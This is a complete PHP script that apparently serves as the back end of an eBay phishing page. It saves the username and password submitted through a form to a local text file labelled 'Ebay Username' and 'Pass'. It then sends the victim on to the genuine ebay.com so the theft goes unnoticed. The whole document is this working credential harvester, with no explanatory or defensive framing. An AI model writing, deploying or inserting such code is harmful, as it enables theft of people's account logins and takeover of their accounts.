<?php

file_put_contents("usernames.txt", "Ebay Username: " . $_POST['userid'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://ebay.com');
exit();
?>
